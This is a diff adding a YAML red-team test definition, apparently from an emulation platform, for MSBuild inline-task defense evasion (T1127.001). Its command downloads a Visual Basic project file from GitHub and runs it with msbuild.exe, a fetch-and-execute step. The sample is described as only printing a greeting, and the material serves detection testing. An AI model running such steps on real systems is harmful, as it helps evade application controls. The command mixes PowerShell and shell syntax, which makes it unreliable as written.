@@ -1,0 +1,58 @@
+- id: ab042179-c0c5-402f-9bc8-42741f5ce359
+  name: MSBuild Bypass Using Inline Tasks (VB)
+  description: Executes the code in a project file using msbuild.exe. The default
+    Visual Basic example file (vb.xml) will simply print "Hello from a Visual Basic
+    inline task!" to the screen.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1127.001
+    name: 'Trusted Developer Utilities Proxy Execution: MSBuild'
+  platforms:
+    windows:
+      sh:
+        command: 'if (Test-Path "PathToAtomicsFolder\T1127.001\src\vb.xml") {exit
+          0} else {exit 1}; then : ; else New-Item -Type Directory (split-path "PathToAtomicsFolder\T1127.001\src\vb.xml")
+          -ErrorAction ignore | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1127.001/src/vb.xml"
+          -OutFile "PathToAtomicsFolder\T1127.001\src\vb.xml"; fi; C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe
+          "PathToAtomicsFolder\T1127.001\src\vb.xml"'
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1127.001
+  - atomic-red-team
+  - defense-evasion
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      filename:
+        description: Location of the project file
+        type: path
+        default: PathToAtomicsFolder\T1127.001\src\vb.xml
+      msbuildpath:
+        description: Default location of MSBuild
+        type: path
+        default: C:\Windows\Microsoft.NET\Framework\v4.0.30319
+      msbuildname:
+        description: Default name of MSBuild
+        type: path
+        default: msbuild.exe
+    dependencies:
+    - description: 'Project file must exist on disk at specified location (#{filename})
+
+        '
+      prereq_command: 'if (Test-Path "#{filename}") {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: 'New-Item -Type Directory (split-path "#{filename}") -ErrorAction
+        ignore | Out-Null
+
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1127.001/src/vb.xml"
+        -OutFile "#{filename}"
+
+        '
+    technique_created: '2020-03-27T21:50:26.042Z'
+    atomic_guid: ab042179-c0c5-402f-9bc8-42741f5ce359
+    import_timestamp: '2025-06-24T11:15:01.304285Z'
